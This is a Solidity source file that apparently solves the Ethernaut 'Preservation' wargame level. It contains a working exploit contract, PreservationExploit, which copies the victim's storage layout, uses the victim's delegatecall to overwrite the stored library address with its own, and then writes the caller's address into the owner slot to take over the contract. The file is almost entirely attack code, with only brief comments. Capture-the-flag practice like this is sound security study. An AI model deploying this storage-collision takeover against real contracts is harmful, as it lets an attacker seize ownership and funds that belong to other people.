// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract Preservation {

  function setFirstTime(uint _timeStamp) public {}
  
}

contract PreservationExploit {

    address public slot1;
    address public slot2;
    address public slot3;

    Preservation victim;

    constructor (address _victimAddr) public {
        victim = Preservation(_victimAddr);
    }

    function showAddr() public view returns (address) {
        return address(this);
    }

    // uint will be implicitly converted back to address during assignment to timeZone1Library
    function setLibrary1Address() public {
        victim.setFirstTime(uint256(address(this)));
    }

    // victim will perform delegatecall on this contract address
    function claimOwnership() public {
        victim.setFirstTime(uint256(msg.sender));
    }

    // slot3 is victim owner variable
    function setTime(uint256 _time) public {
        slot3 = address(_time);
    }
}